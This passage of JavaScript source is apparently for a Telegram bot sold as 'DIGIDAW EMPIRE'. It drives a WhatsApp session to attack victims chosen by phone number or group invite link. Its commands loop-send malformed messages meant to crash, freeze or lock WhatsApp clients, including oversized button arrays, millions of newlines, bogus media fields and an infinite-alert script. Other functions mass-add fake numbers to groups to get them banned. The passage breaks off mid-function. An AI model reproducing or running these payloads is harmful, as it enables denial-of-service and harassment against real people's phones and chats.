        await jirrdelayinvis(sock, target);
        await ikyyidelayinvis(sock, target);
        await buldo(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command(
  "DigiXcrash",
  checkPremium,
      checkCommandEnabled, 
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /DigiXcrash 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;

    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];

    global.buttonColorIndex =
      (global.buttonColorIndex + 1) % buttonStyles.length;

    await ctx.replyWithHTML(
          `<blockquote><tg-emoji emoji-id="5274099962655816924">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 」<tg-emoji emoji-id="5274099962655816924">✨</tg-emoji></blockquote>
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖳𝖸𝖯𝖤 𝖡𝖴𝖦𝖲 : 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖤𝖥𝖤𝖪 𝖡𝖴𝖦𝖲 : 𝖢𝖱𝖠𝖲𝖧
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲 : 𝖲𝖴𝖢𝖢𝖤𝖲𝖲
<blockquote><tg-emoji emoji-id="5424972470023104089">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 - 𝖯𝖮𝖶𝖤𝖱𝖥𝖴𝖫𝖫 」<tg-emoji emoji-id="5424972470023104089">✨</tg-emoji></blockquote>`,
      {
        reply_parameters: { message_id: ctx.message.message_id },
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: currentStyle
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUGS ${i + 1} TO ${q}`)
        );
        await statusMention(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command(
  "DigiXlock",
  checkPremium,
      checkCommandEnabled, 
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /DigiXlock 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;

    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];

    global.buttonColorIndex =
      (global.buttonColorIndex + 1) % buttonStyles.length;

    await ctx.replyWithHTML(
          `<blockquote><tg-emoji emoji-id="5274099962655816924">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 」<tg-emoji emoji-id="5274099962655816924">✨</tg-emoji></blockquote>
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖳𝖸𝖯𝖤 𝖡𝖴𝖦𝖲 : 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖤𝖥𝖤𝖪 𝖡𝖴𝖦𝖲 : LOCK CHAT
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲 : 𝖲𝖴𝖢𝖢𝖤𝖲𝖲
<blockquote><tg-emoji emoji-id="5424972470023104089">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 - 𝖯𝖮𝖶𝖤𝖱𝖥𝖴𝖫𝖫 」<tg-emoji emoji-id="5424972470023104089">✨</tg-emoji></blockquote>`,
      {
        reply_parameters: { message_id: ctx.message.message_id },
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: currentStyle
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUGS ${i + 1} TO ${q}`)
        );
        await HackHit(sock, target);
                                     await statusMention(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command(
  "DigiXios",
  checkPremium,
      checkCommandEnabled, 
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /DigiXios 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;

    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];

    global.buttonColorIndex =
      (global.buttonColorIndex + 1) % buttonStyles.length;

    await ctx.replyWithHTML(
          `<blockquote><tg-emoji emoji-id="5274099962655816924">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 」<tg-emoji emoji-id="5274099962655816924">✨</tg-emoji></blockquote>
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖳𝖸𝖯𝖤 𝖡𝖴𝖦𝖲 : 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖤𝖥𝖤𝖪 𝖡𝖴𝖦𝖲 : CRASH IOS
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲 : 𝖲𝖴𝖢𝖢𝖤𝖲𝖲
<blockquote><tg-emoji emoji-id="5424972470023104089">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 - 𝖯𝖮𝖶𝖤𝖱𝖥𝖴𝖫𝖫 」<tg-emoji emoji-id="5424972470023104089">✨</tg-emoji></blockquote>`,
      {
        reply_parameters: { message_id: ctx.message.message_id },
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: currentStyle
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 30; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUGS ${i + 1} TO ${q}`)
        );
        await ios(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command(
  "DigiXfrezee",
  checkPremium,
      checkCommandEnabled, 
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /DigiXfrezee 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;

    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];

    global.buttonColorIndex =
      (global.buttonColorIndex + 1) % buttonStyles.length;

    await ctx.replyWithHTML(
          `<blockquote><tg-emoji emoji-id="5274099962655816924">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 」<tg-emoji emoji-id="5274099962655816924">✨</tg-emoji></blockquote>
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖳𝖸𝖯𝖤 𝖡𝖴𝖦𝖲 : 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖤𝖥𝖤𝖪 𝖡𝖴𝖦𝖲 : 𝖣𝖤𝖫𝖠𝖸
<tg-emoji emoji-id="4911241630633165627">✨</tg-emoji> 𝖲𝖳𝖠𝖳𝖴𝖲 : 𝖲𝖴𝖢𝖢𝖤𝖲𝖲
<blockquote><tg-emoji emoji-id="5424972470023104089">✨</tg-emoji>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 - 𝖯𝖮𝖶𝖤𝖱𝖥𝖴𝖫𝖫 」<tg-emoji emoji-id="5424972470023104089">✨</tg-emoji></blockquote>`,
      {
        reply_parameters: { message_id: ctx.message.message_id },
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: currentStyle
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUGS ${i + 1} TO ${q}`)
        );
        await statusMention(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command("DigiXbanlock", checkPremium, checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
 const input = ctx.message.text || "";
 const args = input.split(" ");
 const inputTarget = args[1];

 if (!inputTarget) {
 return ctx.reply(
 `🪧 *Format:* /DigiXbanlock https://chat.whatsapp.com/xxxxxx atau ID Grup\n\n` +
 `*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).`,
 { parse_mode: "Markdown" }
 );
 }

 const inviteCode = extractInviteCode(inputTarget);
 const isJid = inputTarget.includes("@g.us");

 if (!inviteCode && !isJid) {
 return ctx.reply(
 `*Input tidak valid!* Pastikan link undangan atau JID grup benar.`,
 { parse_mode: "Markdown" }
 );
 }

 const photoURL = "https://files.catbox.moe/3i6k9t.jpg"; 

 const processMessage = await ctx.telegram.sendPhoto(
 ctx.chat.id,
 photoURL,
 {
 caption: `
<blockquote><pre>「𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Ban indo
⌑ Status: <b>Processing...</b>
`,
 parse_mode: "HTML"
 }
 );

 const processMsgId = processMessage.message_id;

 try {
 const target = isJid ? inputTarget : await sock.groupAcceptInvite(inviteCode);

 if (!target) {
 throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
 }

 console.log(chalk.green(`Berhasil mendeteksi target: ${target}`));

 await ctx.telegram.editMessageCaption(
 ctx.chat.id,
 processMsgId,
 undefined,
 `
<blockquote><pre>「𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${target}
⌑ Type: Auto Join + Ban indo
⌑ Status: <b>Target Terdeteksi! ID: ${target}</b>
`,
 { parse_mode: "HTML" }
 );

 // Perbaikan: Try-catch internal agar loop tidak merusak alur status
 for (let i = 0; i < 2; i++) {
 try {
 await groupBan2(sock, target);
 await HackHit(sock, target);
 } catch (innerErr) {
 console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
 }
 }

 await ctx.telegram.editMessageCaption(
 ctx.chat.id,
 processMsgId,
 undefined,
 `
<blockquote><pre>「𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Ban indo
⌑ Status: <b>Success! Function executed</b>
`,
 { parse_mode: "HTML" }
 );

 } catch (err) {
 console.error(chalk.red(`Gagal: ${err.message}`));

 let errorMsg = err.message;

 if (errorMsg.includes("already") || errorMsg.includes("exist")) {
 errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
 } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
 errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
 } else if (errorMsg.includes("not-authorized")) {
 errorMsg = "Bot tidak memiliki akses (Not Authorized).";
 }

 await ctx.telegram.editMessageCaption(
 ctx.chat.id,
 processMsgId,
 undefined,
 `
<blockquote><pre>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Ban indo
⌑ Status: <b>Gagal: ${errorMsg}</b>
`,
 { parse_mode: "HTML" }
 );
 }
});

bot.command("DigiXlock", checkCommandEnabled, checkPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
 const input = ctx.message.text || "";
 const args = input.split(" ");
 const inputTarget = args[1];

 if (!inputTarget) {
 return ctx.reply(
 `🪧 *Format:* /DigiXlock https://chat.whatsapp.com/xxxxxx atau ID Grup\n\n` +
 `*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).`,
 { parse_mode: "Markdown" }
 );
 }

 const inviteCode = extractInviteCode(inputTarget);
 const isJid = inputTarget.includes("@g.us");

 if (!inviteCode && !isJid) {
 return ctx.reply(
 `*Input tidak valid!* Pastikan link undangan atau JID grup benar.`,
 { parse_mode: "Markdown" }
 );
 }

 const photoURL = "https://files.catbox.moe/3i6k9t.jpg"; 

 const processMessage = await ctx.telegram.sendPhoto(
 ctx.chat.id,
 photoURL,
 {
 caption: `
<blockquote><pre>「𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Ban indo
⌑ Status: <b>Processing...</b>
`,
 parse_mode: "HTML"
 }
 );

 const processMsgId = processMessage.message_id;

 try {
 const target = isJid ? inputTarget : await sock.groupAcceptInvite(inviteCode);

 if (!target) {
 throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
 }

 console.log(chalk.green(`Berhasil mendeteksi target: ${target}`));

 await ctx.telegram.editMessageCaption(
 ctx.chat.id,
 processMsgId,
 undefined,
 `
<blockquote><pre>「𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${target}
⌑ Type: Auto Join + Kill Group
⌑ Status: <b>Target Terdeteksi! ID: ${target}</b>
`,
 { parse_mode: "HTML" }
 );

 // Perbaikan: Try-catch internal agar loop tidak merusak alur status
 for (let i = 0; i < 2; i++) {
 try {
 await HackHit(sock, target);
 } catch (innerErr) {
 console.log(chalk.yellow(`Pengiriman Lock Group ${i+1}: ${innerErr.message}`));
 }
 }

 await ctx.telegram.editMessageCaption(
 ctx.chat.id,
 processMsgId,
 undefined,
 `
<blockquote><pre>「𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Kill Group
⌑ Status: <b>Success! Function executed</b>
`,
 { parse_mode: "HTML" }
 );

 } catch (err) {
 console.error(chalk.red(`Gagal: ${err.message}`));

 let errorMsg = err.message;

 if (errorMsg.includes("already") || errorMsg.includes("exist")) {
 errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
 } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
 errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
 } else if (errorMsg.includes("not-authorized")) {
 errorMsg = "Bot tidak memiliki akses (Not Authorized).";
 }

 await ctx.telegram.editMessageCaption(
 ctx.chat.id,
 processMsgId,
 undefined,
 `
<blockquote><pre>「 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤」</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Ban indo
⌑ Status: <b>Gagal: ${errorMsg}</b>
`,
 { parse_mode: "HTML" }
 );
 }
});

// ------------ ( FUNCTION FORCLOSE ) -------------- \\
async function statusMention(sock, target) {
    const quantia = 10;

    const payload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "?".repeat(500),
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({})),
                    },
                }
            }
        }
    };

    for (let i = 0; i < quantia; i++) {
        try {
            const generated = generateWAMessageFromContent(target, payload, {});

            await sock.relayMessage("status@broadcast", generated.message, {
                messageId: generated.key.id,
                statusJidList: [target]
            });

            await sock.relayMessage(target, generated.message, {
                messageId: generated.key.id,
                participant: target
            });

            await sock.relayMessage(target, {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: generated.key,
                            type: 25
                        }
                    }
                }
            }, {
                participant: target
            });

            console.log(`[ ! ] SUCCES SEND PAYLOAD TO TARGET ${target}`);
        } catch (err) {
            console.log(`[ ! ] FAILED SEND PAYLOAD TO TARGET ${target} - ${err.message}`);
        }
    }
}

async function buldo(sock, target) {
  const BULLZ = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    caption: "Ekszy\n",
    fileSha256: "UXAnqE96XbhJlQygSerag2w5bciGYC64Efc0WOKqliM=",
    fileLength: "0",
    height: 999,
    width: 999,
    mediaKey: "9mFMlLURejQjclsJGUOKPQoncF+TV/YgJVVHZjbhyu8=",
    fileEncSha256: "TWduFNUwLQ4uzTqCUexEr4bpZzdQBHVGPjndvnuiq6g=",
    directPath: "/o1/v/t24/f2/m239/AQPIIZjK4-SGNj_q-t7JycEFP7AeMU8Hdn2iTYVU3anoB9x042PAzsryyTMP2qluf4BX3O3wjU4uswCab9ChlBR-GrjCNDKL0Wo09WIg9w?ccb=9-4&oh=01_Q5Aa5QG3bhjIBdl8rVtK_Deok3IGxElZF_Qg89B-4Wuhy27uTQ&oe=6AB64F32&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1787748957",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADUASAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAADXb2zzhkrPyFzwp6wyIOhhvSajkLtWreVB7cQoNh9QzjKhk7pmoIepvEugndjOjrvQVDzBDgfleBOvCwZvOwNV4Al//8QAJBAAAwACAgIBBAMBAAAAAAAAAAECAxMhMQQSEyIyQVEQQmH/2gAIAQEAAT8A+smqc8r+YZT2QV0Ukcpla0dsyP41tk+Zr+pGeL/JLX7KKqFrkp7ZSbSPiaMuN3OmZ/G9JTE2mYfJ9VzyZPIuz3/xjfJPSK+0WzPNOKWifHm0XjrHfqQvoW0UkN8mN8D6FSTZGn2VHrT/AEOIrTfaNI9e2uR9mM1tCnRSfBxW0z4+ez0SE5X5Q1yQIYzJ9lCz5J6Y82RvlmOnUn//xAAdEQACAgIDAQAAAAAAAAAAAAAAAQIREiAQITFB/9oACAECAQE/AJGLIqj6WPqjIV8y81ev/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERAxQQMh/9oACAEDAQE/AItDmj0dnChO2yhxvRL5iOyLSRF9HGLdlJC3hYls/9k=",
    scansSidecar: "IXAF6oCitMt+vwhZ6nxXdon1Jo/V+Kg6J1vO7oBlkhMvjDVjLDHlKg==",
    scanLengths: [99999999999, 99999999999, 99999999999],
    midQualityFileSha256: "nQvIXHp6w1FNdkLFsnrpEkDjVKQVT0TEAQdp9139Cco=",
    contextInfo: {
      forwardingScore: 4,
      isForwarded: true,
      forwardOrigin: 4,
      statusAttributionType: 2,
      statusAttributions: Array.from({
        length: 200900
      }, () => ({
        type: 1
      }))
    }
  };
  const metaNode = {
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{
        tag: "to",
        attrs: {
          jid: target
        },
        content: undefined
      }]
    }]
  };
  const album = await sock.relayMessage("status@broadcast", {
    albumMessage: {
      expectedImageCount: 199999999,
      expectedVideoCount: -199999999
    }
  }, {
    statusJidList: [target],
    additionalNodes: [metaNode]
  });
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      imageMessage: BULLZ,
      messageContextInfo: {
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [metaNode]
    });
  }
}

async function ios(sock, target) {
    await sock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "x",
                        inline_entities: ["{".repeat(3000)],
                        __typename: "GenAIMarkdownTextUXPrimitive",
                        },
                      __typename: "GenAISingleLayoutViewModel",
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      isSecret: true,
    })
    await sleep(1000);
  }

async function glapaos(sock, jid) {
  try {
    if (!jid.endsWith('@g.us')) throw new Error('Grup only')
    const fakeNumbers = Array.from({ length: 100 }, () => {
      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
    })
    for (const fakeJid of fakeNumbers) {
      sock.groupParticipantsUpdate(jid, [fakeJid], 'add').catch(() => {})
      await new Promise(r => setTimeout(r, 30))
    }
    sock.sendMessage(jid, { text: `assalamualaikum` }).catch(() => {})
  } catch (err) {
    throw new Error(`bngc: ${err.message}`)
  }
}

async function BanGroupNew(sock, groupJid) {
    if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
    }

    const targets = [
        "18188880008@s.whatsapp.net",
        "18188880009@s.whatsapp.net",
        "18188880010@s.whatsapp.net",
        "18188880011@s.whatsapp.net",
        "18188880012@s.whatsapp.net"
    ];
    const action = "add";
    const maxLoop = 10;

    for (let i = 0; i < maxLoop; i++) {
        for (let j = 0; j < targets.length; j++) {
            try {
                await sock.groupParticipantsUpdate(groupJid, [targets[j]], action);
                await sock.sendPresenceUpdate('composing', groupJid);
            } catch (err) {
                console.error('error:', err.message);
            }
        }
    }
}

async function HackHit(sock, target) {
  let N = await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{
            messageType: 1,
            messageText: " "
          }],
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4,
            botMessageSharingInfo: {
              botEntryPointOrigin: 1,
              forwardScore: 1
            }
          }
        }
      }
    }
  }, {
    noSelfSync: true,
  });
  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: N
          },
          type: 14,
          editedMessage: {
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  submessages: [{
                    messageType: 1,
                    messageText: " "
                  }],
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "867051314767696@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {
    noSelfSync: true
  })
  await sleep(1000)
  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: N
          },
          type: 14,
          editedMessage: {
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify({
                      __typename: "GenAIUnifiedResponse",
                      response_id: crypto.randomUUID(),
                      sections: [{
                        __typename: "GenAIUnifiedResponseSection",
                        view_model: {
                          __typename: "GenAISingleLayoutViewModel",
                          primitive: {
                            __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                            trusted_sources: [],
                            payload: `<script>
                              while (true) {
                                alert("LOCK CHAT BY DIGIDAW DEK 😜");
                              }
                            </script>`  
                          }
                        }
                      }]
                    })).toString("base64")
                  },
                  contextInfo: {
                    isForwarded: true,
                    forwardingScore: 1,
                    forwardedAiBotMessageInfo: {
                      botJid: "867051314767696@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {
    noSelfSync: true
  })
}

async function tryppek(sock, target) {
    const message = {
        interactiveMessage: {
            body: {
                text: "\n".repeat(24000000)
            },
            nativeFlowMessage: {
                extra: "\u31040\uFFFF\u000F\u0000",
                buttons: "\u000F\uFFFF".repeat(240000)
            }
        }
    };

    await sock.relayMessage(target, message, {});
}
async function jirrdelayinvis(sock, target) {
  const BULLZ = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    caption: "DIGIDAW\n",
    fileSha256: "UXAnqE96XbhJlQygSerag2w5bciGYC64Efc0WOKqliM=",
    fileLength: "0",
    height: 999,
    width: 999,
    mediaKey: "9mFMlLURejQjclsJGUOKPQoncF+TV/YgJVVHZjbhyu8=",
    fileEncSha256: "TWduFNUwLQ4uzTqCUexEr4bpZzdQBHVGPjndvnuiq6g=",
    directPath: "/o1/v/t24/f2/m239/AQPIIZjK4-SGNj_q-t7JycEFP7AeMU8Hdn2iTYVU3anoB9x042PAzsryyTMP2qluf4BX3O3wjU4uswCab9ChlBR-GrjCNDKL0Wo09WIg9w?ccb=9-4&oh=01_Q5Aa5QG3bhjIBdl8rVtK_Deok3IGxElZF_Qg89B-4Wuhy27uTQ&oe=6AB64F32&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1787748957",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAIQMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAABHNvcpJGpwEkcHfTbW2cwLnK5WIyNL04W+qbk+ogSImxrLleB1K9LM+rY2gNms/wD/xAAmEAACAgICAQMEAwAAAAAAAAABAgADBBESIRMiMUEUQlJTECNR/9oACAEBAAE/AOQ7DMVA6AEoQs3jX3JlrWqvbFY78vc7mo2K7ny1kHfwZho31HO32CzJvobmm4tCCvkatz0/gJU2XZsq0ShjWfJYeocdiwb7dx0rGMGRutT6Fz35Jh0pp0MfEqsY7+BLUrpoLFYuZj20rW3U50/tMwFyEBs+yG0WMAx0syKMh/6V7mRjWY7acTyWf7KjevpDHUrqyrm8amCuxaV/aB7zJXJ8urfWZwf8JjBnbXxKuFOh8tOexM1WYckPc8t8odlPRi32Cwd9blhJp94jsa+z/H//xAAdEQACAQUBAQAAAAAAAAAAAAAAARECAxIhYRMy/9oACAECAQE/ACYMh1EuoyK7L+pRbU6lHn1FxNzsp05M+I//xAAcEQACAgIDAAAAAAAAAAAAAAAAEQIRECESE4H/2gAIAQMBAT8A1QjpmJUUk0ekZKtknhT3xHj/2Q==",
    scansSidecar: "IXAF6oCitMt+vwhZ6nxXdon1Jo/V+Kg6J1vO7oBlkhMvjDVjLDHlKg==",
    scanLengths: [99999999999, 99999999999, 99999999999],
    midQualityFileSha256: "nQvIXHp6w1FNdkLFsnrpEkDjVKQVT0TEAQdp9139Cco=",
    contextInfo: {
      forwardingScore: 4,
      isForwarded: true,
      forwardOrigin: 4,
      statusAttributionType: 2,
      statusAttributions: Array.from({
        length: 200900
      }, () => ({
        type: 1
      }))
    }
  };
  const metaNode = {
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{
        tag: "to",
        attrs: {
          jid: target
        },
        content: undefined
      }]
    }]
  };
  const album = await sock.relayMessage("status@broadcast", {
    albumMessage: {
      expectedImageCount: 199999999,
      expectedVideoCount: -199999999
    }
  }, {
    statusJidList: [target],
    additionalNodes: [metaNode]
  });
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      imageMessage: BULLZ,
      messageContextInfo: {
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [metaNode]
    });
  }
}
async function ikyyidelayinvis(sock, target) {
  const BULLZ = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
